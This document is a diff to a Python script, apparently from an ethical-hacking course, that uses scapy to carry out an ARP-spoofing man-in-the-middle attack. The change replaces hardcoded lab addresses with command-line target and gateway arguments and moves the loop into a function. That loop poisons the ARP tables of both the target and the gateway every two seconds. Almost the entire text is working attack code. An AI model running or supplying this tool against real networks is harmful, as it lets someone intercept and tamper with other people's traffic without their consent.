@@ -2,6 +2,22 @@
 
 import time
 import scapy.all as scapy
+import argparse
+
+
+def get_arguments():
+    parser = argparse.ArgumentParser(description="Performs a man-in-the-middle attack between two given IP addresses.")
+    parser.add_argument("-t", "--target", dest="target", help="target address of spoofed device")
+    parser.add_argument("-g", "--gateway", dest="gateway", help="default gateway for the target device")
+    arguments = parser.parse_args()
+
+    if arguments.target is None:
+        parser.error("[-] please specify a target IP address, use --help for more information")
+    if arguments.gateway is None:
+        # TODO: If no gateway specified, perform a search on LAN and choose the default gateway of user's device.
+        parser.error("[-] please specify IP address of the target's default gateway, use --help for more information")
+
+    return arguments
 
 
 def get_mac(ip):
@@ -12,8 +28,8 @@ def get_mac(ip):
     return answered[0][1].hwsrc
 
 
-def spoof(target_ip, spoof_ip):
-    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
+def spoof(target_ip, gateway_ip):
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=gateway_ip)
     scapy.send(packet, verbose=False)
 
 
@@ -23,20 +39,21 @@ def restore(destination_ip, source_ip):
     scapy.send(packet, count=4, verbose=False)
 
 
-target_ip = "10.0.2.8"
-gateway_ip = "10.0.2.1"
+def perform_spoofing(target_ip, gateway_ip):
+    sent_packets_count = 0
+    try:
+        while True:
+            spoof(target_ip, gateway_ip)
+            spoof(gateway_ip, target_ip)
+            sent_packets_count += 2
+            print("\r[+] Sending 2 packets regularly... Total packets sent: " + str(sent_packets_count), end="")
+            time.sleep(2)
+    except KeyboardInterrupt:
+        print("\n[+] Execution aborted. Restoring ARP tables...")
+        restore(target_ip, gateway_ip)
+        restore(gateway_ip, target_ip)
 
-sent_packets_count = 0
-try:
-    while True:
-        spoof(target_ip, gateway_ip)
-        spoof(gateway_ip, target_ip)
-        sent_packets_count += 2
-        print("\r[+] Sending 2 packets regularly... Total packets sent: " + str(sent_packets_count), end="")
-        time.sleep(2)
-except KeyboardInterrupt:
-    print("\n[+] Execution aborted. Restoring ARP tables...")
-    restore(target_ip, gateway_ip)
-    restore(gateway_ip, target_ip)
 
-# TODO: make it work natively in terminal
+args = get_arguments()
+target, gateway = args.target, args.gateway
+perform_spoofing(target, gateway)
